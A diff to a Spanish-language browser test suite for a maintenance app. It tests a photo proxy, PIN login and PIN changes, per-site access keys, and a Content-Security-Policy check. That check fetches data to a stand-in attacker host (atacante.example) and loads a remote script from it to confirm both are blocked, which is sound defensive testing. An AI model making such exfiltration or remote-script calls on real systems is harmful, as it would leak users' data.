@@ -299,10 +299,10 @@ const JPG_B64 ='/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkS
     const { ctx, p } = await nuevaPagina(b, {
       '**/foto?id=*': route => { proxyCalls++; if (route.request().headers()['authorization'] !== 'Bearer SESS.x') auth = false;
         return listo ? route.fulfill({ status: 200, contentType: 'image/jpeg', body: jpg }) : route.fulfill({ status: 404, contentType: 'application/json', body: '{"ok":false}' }); },
-      'https://fake-apps/**': route => { appsCalls++; return route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify({ ok: true, mimeType: 'image/jpeg', base64: JPG_B64 }) }); },
+      'https://script.google.com/macros/s/fake-apps/**': route => { appsCalls++; return route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify({ ok: true, mimeType: 'image/jpeg', base64: JPG_B64 }) }); },
     });
     const r = await p.evaluate(async () => {
-      googleAccessToken = 'SESS.x'; window._fotosUrlSede = () => 'https://fake-apps/exec';
+      googleAccessToken = 'SESS.x'; window._fotosUrlSede = () => 'https://script.google.com/macros/s/fake-apps/exec';
       const ids = Array.from({ length: 6 }, (_, i) => 'FOTOIDXXXXXXXXXX' + i);
       await _precargarFotosEnLotes(ids, null, 3);
       return ids.filter(id => (_fotoDataUrlCache[id] || '').startsWith('data:image')).length;
@@ -335,7 +335,7 @@ const JPG_B64 ='/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkS
       bloques.forEach((bq, i) => { regs[bq.id] = { realizado: true, realizadoPor: 'x' }; fotos[bq.id] = Array.from({ length: 8 }, (_, k) => ({ driveFileId: modo + i + '_' + k + 'XXXXXXXX' })); });
       _leerTodosRegistrosCronogramaAgrupados = async () => ({ [fecha]: regs }); _leerTodasFotosCronogramaAgrupadas = async () => ({ [fecha]: fotos });
       _leerTodasAdicionalesCronogramaAgrupadas = async () => ({}); _leerTodasEntregasTurnoAgrupadas = async () => ({});
-      googleAccessToken = ''; window._fotosUrlSede = () => 'https://fake/exec';
+      googleAccessToken = ''; window._fotosUrlSede = () => 'https://script.google.com/macros/s/fake/exec';
       let reqs = 0; window.fetch = (url, opts) => { reqs++;
         if (modo === 'colgado') return new Promise((res, rej) => { opts && opts.signal && opts.signal.addEventListener('abort', () => { const e = new Error('a'); e.name = 'AbortError'; rej(e); }); });
         return Promise.resolve(new Response(JSON.stringify({ ok: true, mimeType: 'image/jpeg', base64: b64 }), { status: 200 })); };
@@ -535,9 +535,9 @@ const JPG_B64 ='/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkS
     const jpg = Buffer.from(JPG_B64, 'base64');
     const { ctx, p } = await nuevaPagina(b, {
       '**/foto?id=*': route => { proxyCalls++; return falla ? route.fulfill({ status: 503, body: '' }) : route.fulfill({ status: 200, contentType: 'image/jpeg', body: jpg }); },
-      'https://fake-apps/**': route => route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify({ ok: true, mimeType: 'image/jpeg', base64: JPG_B64 }) }),
+      'https://script.google.com/macros/s/fake-apps/**': route => route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify({ ok: true, mimeType: 'image/jpeg', base64: JPG_B64 }) }),
     });
-    await p.evaluate(async () => { googleAccessToken = 'SESS.x'; window._fotosUrlSede = () => 'https://fake-apps/exec'; await _obtenerDataUrlFoto('FOTOIDXXXXXXXXXXA1'); });
+    await p.evaluate(async () => { googleAccessToken = 'SESS.x'; window._fotosUrlSede = () => 'https://script.google.com/macros/s/fake-apps/exec'; await _obtenerDataUrlFoto('FOTOIDXXXXXXXXXXA1'); });
     const tras1 = proxyCalls;
     await p.evaluate(async () => { await _obtenerDataUrlFoto('FOTOIDXXXXXXXXXXA2'); });
     const enPausa = proxyCalls - tras1;
@@ -599,14 +599,18 @@ const JPG_B64 ='/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkS
     globalThis.fetch = async (url, init = {}) => {
       url = String(url); const m = init.method || 'GET'; const d = decodeURIComponent(url);
       if (url.includes('oauth2')) return new Response(JSON.stringify({ access_token: 'T', expires_in: 3600 }));
-      if (url.includes('/HU/')) return new Response(JSON.stringify({ values: [['Documento', 'Nombre', 'PINHash', 'Rol', 'Activo'], ['111', 'Op', h('1111'), 'operario', 'SI']] }));
+      if (url.includes('/HU/')) return new Response(JSON.stringify({ values: [['Documento', 'Nombre', 'PINHash', 'Rol', 'Activo'], ['111', 'Op', h('482915'), 'operario', 'SI']] }));
       if (url.includes('fields=')) return new Response(JSON.stringify({ sheets: ['Ordenes', 'Tareas', 'Config', 'HorasEquipos', 'Movimientos'].map((t, i) => ({ properties: { sheetId: i, title: t } })) }));
       if (d.includes('Config!A1:A1')) return new Response(JSON.stringify({ values: [[h('clave-sede').toLowerCase()]] }));
       if (d.includes('Config!B1')) { if (m === 'PUT') { b1 = JSON.parse(init.body).values[0][0]; return new Response('{}'); } return new Response(JSON.stringify({ values: b1 ? [[b1]] : [] })); }
       if (url.includes('values:batchGet')) { const n = (url.match(/ranges=/g) || []).length; return new Response(JSON.stringify({ valueRanges: Array.from({ length: n }, () => ({ values: [] })) })); }
       return new Response(JSON.stringify(m === 'GET' ? { values: [] } : { replies: [{}], updates: {} }), { headers: { 'Content-Type': 'application/json' } });
     };
-    const ses = (await (await worker.fetch(new Request('https://w/login', { method: 'POST', body: JSON.stringify({ documento: '111', pin: '1111' }) }), env)).json()).session;
+    const ses = (await (await worker.fetch(new Request('https://w/login', { method: 'POST', body: JSON.stringify({ documento: '111', pin: '482915' }) }), env)).json()).session;
+    // La clave de la sede da el pase de sede que la app manda en cada petición.
+    const INV_ZIPA = '1cqfk7gKRX4MfnHnPEZy7WGOunwT7kYLfJ14_W10Wh3s', ORD_SOACHA = '1Dv4veJWQPP2tZkYXRXLPo0MQmu8cR843TBO3D0uChP8';
+    const paseSede = (await (await worker.fetch(new Request('https://w/sede', { method: 'POST', headers: { Authorization: 'Bearer ' + ses },
+      body: JSON.stringify({ spreadsheetId: INV_ZIPA, clave: 'clave-sede' }) }), env)).json()).paseSede;
     const rechazos = [];
     const ctx = await b.newContext({ serviceWorkers: 'block' });
     await ctx.route('**/*.workers.dev/**', async route => {
@@ -616,11 +620,12 @@ const JPG_B64 ='/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkS
       if (resp.status === 403) rechazos.push(rq.method() + ' ' + decodeURIComponent(rq.url().replace(/^.*workers\.dev/, '')).slice(0, 120));
       return route.fulfill({ status: resp.status, body: txt, headers: { 'Content-Type': 'application/json' } });
     });
-    await ctx.addInitScript(ses => {
+    await ctx.addInitScript(({ ses, paseSede }) => {
       sessionStorage.setItem('gUser', JSON.stringify({ name: 'Op', email: '111', initials: 'OP' }));
       sessionStorage.setItem('gToken', ses); sessionStorage.setItem('gRol', 'operario');
       sessionStorage.setItem('operacionAutenticada', 'zipaquira'); try { localStorage.setItem('operacionActual', 'zipaquira'); } catch (e) {}
-    }, ses);
+      sessionStorage.setItem('paseSede', JSON.stringify({ sede: 'zipaquira', pase: paseSede }));
+    }, { ses, paseSede });
     const p = await ctx.newPage(); const errs = []; p.on('pageerror', e => errs.push(String(e)));
     p.on('dialog', d => d.dismiss().catch(() => {}));
     await p.goto(BASE, { waitUntil: 'load' }); await p.waitForTimeout(2500);
@@ -647,13 +652,23 @@ const JPG_B64 ='/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkS
         () => asegurarHoja(SH.empalmeMantenimientos, EMPALME_MANTENIMIENTOS_COLS), () => leerHojaGenerica(SH.empalmeMantenimientos),
       ];
       for (const paso of pasos) { try { await paso(); } catch (e) { fallos.push(String(e.message).slice(0, 120)); } await new Promise(x => setTimeout(x, 250)); }
+      // Con la clave de Zipaquirá, las hojas de otra sede siguen cerradas (y eso no vuelve a pedir la clave de Zipaquirá).
+      const otra = await fetch(SHEETS_API + '/v4/spreadsheets/' + OPERACIONES.soacha.spreadsheetId + '/values/' + encodeURIComponent('Ordenes!A1:B2'),
+        { headers: { Authorization: 'Bearer ' + googleAccessToken } });
+      const otraSede = otra.status + ':' + ((await otra.json()).sede === true);
+      await new Promise(x => setTimeout(x, 300));
+      const sigueEnZipa = operacionAutenticada === true && !document.getElementById('claveSedeInput');
       const sedeOk = await validarClaveSedeDirecto('zipaquira', 'clave-sede');
+      const paseGuardado = !!JSON.parse(sessionStorage.getItem('paseSede') || '{}').pase;
       const sedeMal = await validarClaveSedeDirecto('zipaquira', 'otra');
-      return { fallos, sedeOk, sedeMal };
+      return { fallos, sedeOk, sedeMal, otraSede, sigueEnZipa, paseGuardado };
     });
     globalThis.fetch = fetchOriginal;
-    check('App + proxy real: el operario no choca con la lista blanca', rechazos.length === 0 && r.fallos.length === 0 && errs.length === 0, { rechazos, fallos: r.fallos, errs: errs.slice(0, 2) });
-    check('Clave de sede se valida en el proxy (correcta sí, incorrecta no)', r.sedeOk === true && r.sedeMal === false, r);
+    const rechazosZipa = rechazos.filter(x => !x.includes(ORD_SOACHA));
+    check('App + proxy real: el operario no choca con la lista blanca (con el pase de su sede en cada petición)', rechazosZipa.length === 0 && r.fallos.length === 0 && errs.length === 0, { rechazos: rechazosZipa, fallos: r.fallos, errs: errs.slice(0, 2) });
+    check('App + proxy real: con la clave de Zipaquirá no se abren las hojas de otra sede, y eso no vuelve a pedir la clave de Zipaquirá',
+      r.otraSede === '403:true' && r.sigueEnZipa, r);
+    check('Clave de sede se valida en el proxy (correcta sí, incorrecta no) y la correcta deja guardado el pase de sede', r.sedeOk === true && r.sedeMal === false && r.paseGuardado, r);
     await ctx.close();
   }
 
@@ -818,7 +833,7 @@ const JPG_B64 ='/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkS
     const { ctx, p } = await nuevaPagina(b, {
       '**/foto?id=*': r => r.fulfill({ status: 503, body: '' }),
       '**/pase-fotos': r => { pedidosDePase++; return r.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify({ ok: true, pase: 'PASE' + pedidosDePase, exp: Math.floor(Date.now() / 1000) + 3600 }) }); },
-      'https://fake-apps/**': route => {
+      'https://script.google.com/macros/s/fake-apps/**': route => {
         const rq = route.request();
         alScript.push(rq.method() === 'GET' ? rq.url() : JSON.parse(rq.postData() || '{}'));
         if (rq.method() === 'POST' && paseInvalidoUnaVez) { paseInvalidoUnaVez = false; return route.fulfill({ status: 200, contentType: 'application/json', body: '{"ok":false,"paseInvalido":true}' }); }
@@ -826,7 +841,7 @@ const JPG_B64 ='/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkS
       },
     });
     const r = await p.evaluate(async () => {
-      googleAccessToken = 'SESS.x'; window._fotosUrlSede = () => 'https://fake-apps/exec';
+      googleAccessToken = 'SESS.x'; window._fotosUrlSede = () => 'https://script.google.com/macros/s/fake-apps/exec';
       const subida = await (await _postScriptFotos({ accion: 'subirFoto', tipo: 'orden', base64: 'AA==' })).json();
       _fotosProxyPausaHasta = 0;
       const foto = await _obtenerDataUrlFoto('FOTOIDXXXXXXXXXXZ9');
@@ -844,10 +859,10 @@ const JPG_B64 ='/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkS
     const alScript = [];
     const { ctx, p } = await nuevaPagina(b, {
       '**/pase-fotos': r => r.fulfill({ status: 404, contentType: 'application/json', body: '{"ok":false,"mensaje":"Ruta no encontrada."}' }),
-      'https://fake-apps/**': route => { alScript.push(JSON.parse(route.request().postData() || '{}')); return route.fulfill({ status: 200, contentType: 'application/json', body: '{"ok":true}' }); },
+      'https://script.google.com/macros/s/fake-apps/**': route => { alScript.push(JSON.parse(route.request().postData() || '{}')); return route.fulfill({ status: 200, contentType: 'application/json', body: '{"ok":true}' }); },
     });
     const ok = await p.evaluate(async () => {
-      googleAccessToken = 'SESS.x'; window._fotosUrlSede = () => 'https://fake-apps/exec';
+      googleAccessToken = 'SESS.x'; window._fotosUrlSede = () => 'https://script.google.com/macros/s/fake-apps/exec';
       return (await (await _postScriptFotos({ accion: 'eliminarFoto', driveFileId: 'X' })).json()).ok;
     });
     check('C1: con el proxy viejo las fotos siguen funcionando (sin pase)', ok && alScript.length === 1 && !('pase' in alScript[0]), alScript);
@@ -1637,6 +1652,72 @@ const JPG_B64 ='/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkS
       r.fechas.ida && r.fechas.am === '2026-11-09 02:05' && r.fechas.pm === '2026-11-09 14:05' && r.fechas.medianoche === '2026-11-09 00:05'
       && r.fechas.mediodia === '2026-11-09 12:05' && r.fechas.h24 === '2026-11-09 14:05' && r.fechas.vacia === null && r.fechas.otra === null, r.fechas);
     check('Horómetro imposible: sin errores de JS ni avisos', errs.length === 0 && r.avisos.length === 0, { errs: errs.slice(0, 2), avisos: r.avisos });
+    await ctx.close();
+  }
+  {
+    // PIN de menos de 6 números: al entrar se pide crear uno nuevo (el proxy no
+    // deja hacer nada más); con un pase así guardado, al abrir también. Y si el
+    // proxy dice que falta la clave de la sede, se vuelve a pedir.
+    const b64 = o => Buffer.from(JSON.stringify(o)).toString('base64url');
+    const paseCp = 'h.' + b64({ doc: '9001', cp: true, exp: 9e9 }) + '.f', paseNuevo = 'h.' + b64({ doc: '9001', exp: 9e9 }) + '.g';
+    const cambios = []; let respuestaCambio = 0;
+    const { ctx, p, errs } = await nuevaPagina(b, {
+      '**/login': r => r.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify({ ok: true, session: paseCp, nombre: 'Nuevo Uno', rol: 'operario', cambiarPin: true }) }),
+      '**/cambiar-pin': r => { cambios.push(JSON.parse(r.request().postData() || '{}'));
+        return respuestaCambio++ === 0 ? r.fulfill({ status: 400, contentType: 'application/json', body: '{"ok":false,"mensaje":"Ese PIN es muy fácil de adivinar: no repitas el mismo número."}' })
+          : r.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify({ ok: true, session: paseNuevo }) }); },
+    });
+    const ventana = '.confirmar-fondo form';
+    const llenar = async (valores) => { await p.waitForSelector(ventana); await p.waitForTimeout(550);
+      const ins = await p.$$(ventana + ' input'); for (let i = 0; i < valores.length; i++) await ins[i].fill(valores[i]);
+      await p.click(ventana + ' [data-respuesta="si"]'); await p.waitForTimeout(400); };
+    await p.fill('#loginDocumento', '9001'); await p.fill('#loginPin', '1234'); await p.click('#loginBtn');
+    await p.waitForSelector(ventana);
+    const r = { campos: await p.$$eval(ventana + ' input', l => l.map(i => i.type).join(',')), titulo: await p.textContent(ventana + ' .confirmar-titulo') };
+    await llenar(['583920', '583921']);
+    r.noIguales = await p.textContent(ventana + ' .confirmar-error');
+    await llenar(['777777', '777777']);
+    await p.waitForSelector(ventana); r.errorDelProxy = await p.textContent(ventana + ' .confirmar-texto');
+    await Promise.all([p.waitForNavigation({ waitUntil: 'load' }), llenar(['583920', '583920'])]);
+    await p.waitForTimeout(600);
+    r.guardado = await p.evaluate(() => sessionStorage.getItem('gToken'));
+    r.sinVentana = !(await p.$(ventana));
+    // Al abrir con un pase que todavía debe cambiar el PIN, se pide (con el PIN actual).
+    await p.evaluate(t => sessionStorage.setItem('gToken', t), paseCp); await p.reload({ waitUntil: 'load' }); await p.waitForTimeout(800);
+    r.alAbrir = await p.$$eval(ventana + ' input', l => l.length).catch(() => 0);
+    check('PIN corto: al entrar pide crear uno nuevo (con campos de clave), revisa que coincidan, muestra lo que dice el proxy y al guardarlo entra con el pase nuevo',
+      r.titulo === 'Crea tu PIN nuevo' && r.campos === 'password,password' && /no son iguales/.test(r.noIguales) && /muy fácil/.test(r.errorDelProxy)
+      && cambios.length === 2 && cambios[1].pinActual === '1234' && cambios[1].pinNuevo === '583920' && r.guardado === paseNuevo && r.sinVentana && r.alAbrir === 3,
+      { r, cambios });
+    // El proxy pide la clave de la sede: se vuelve a pedir, y cada petición llevaba el pase de sede.
+    await p.evaluate(() => document.querySelectorAll('.confirmar-fondo').forEach(x => x.remove()));
+    const cabeceras = [];
+    await ctx.route('**/sheets/v4/**', r2 => { cabeceras.push(r2.request().headers()['x-pase-sede'] || ''); return r2.fulfill({ status: 403, contentType: 'application/json', body: '{"ok":false,"sede":true}' }); });
+    await p.evaluate(t => { sessionStorage.setItem('gToken', t); sessionStorage.setItem('gUser', JSON.stringify({ name: 'Nuevo Uno', email: '9001', initials: 'NU' }));
+      sessionStorage.setItem('operacionAutenticada', 'zipaquira'); localStorage.setItem('operacionActual', 'zipaquira');
+      sessionStorage.setItem('paseSede', JSON.stringify({ sede: 'zipaquira', pase: 'PASE-ZIPA' })); }, paseNuevo);
+    await p.reload({ waitUntil: 'load' }); await p.waitForTimeout(2500);
+    const s2 = await p.evaluate(() => ({ pideClave: !!document.getElementById('claveSedeInput'), autenticada: sessionStorage.getItem('operacionAutenticada'), pase: sessionStorage.getItem('paseSede') }));
+    check('Clave de sede: las peticiones a Sheets llevan el pase de sede, y si el proxy pide la clave se vuelve a pedir (y se borra el pase viejo)',
+      cabeceras[0] === 'PASE-ZIPA' && cabeceras.every(c => c === 'PASE-ZIPA' || c === '') && s2.pideClave && s2.autenticada === null && s2.pase === null, { cabeceras: cabeceras.slice(0, 3), s2 });
+    check('PIN y clave de sede: sin errores de JS', errs.length === 0, errs.slice(0, 3));
+    await ctx.close();
+  }
+  {
+    // CSP: la página solo carga código propio y solo habla con el proxy y los
+    // scripts de fotos de Google; las gráficas vienen del propio sitio.
+    const { ctx, p, errs } = await nuevaPagina(b);
+    const r = await p.evaluate(async () => {
+      const out = { chart: typeof window.Chart === 'function', csp: !!document.querySelector('meta[http-equiv="Content-Security-Policy"]'),
+        scriptLocal: [...document.scripts].some(s => /vendor\/chart-4\.4\.0\.umd\.js$/.test(s.src)), sinCdn: ![...document.scripts].some(s => /jsdelivr/.test(s.src)) };
+      try { await fetch('https://atacante.example/robar'); out.fuera = 'pasó'; } catch (_) { out.fuera = 'bloqueado'; }
+      try { await fetch(PROXY_URL + '/ping'); out.proxy = 'permitido'; } catch (_) { out.proxy = 'bloqueado'; }
+      const s = document.createElement('script'); s.src = 'https://atacante.example/x.js';
+      out.scriptFuera = await new Promise(res => { s.onerror = () => res('bloqueado'); s.onload = () => res('pasó'); document.head.appendChild(s); setTimeout(() => res('sin respuesta'), 3000); });
+      return out;
+    });
+    check('CSP: Chart.js desde el propio sitio; no se cargan scripts de afuera ni se mandan datos a otros servidores, y el proxy sí responde',
+      r.chart && r.csp && r.scriptLocal && r.sinCdn && r.fuera === 'bloqueado' && r.proxy === 'permitido' && r.scriptFuera === 'bloqueado' && errs.length === 0, { r, errs: errs.slice(0, 2) });
     await ctx.close();
   }
   {
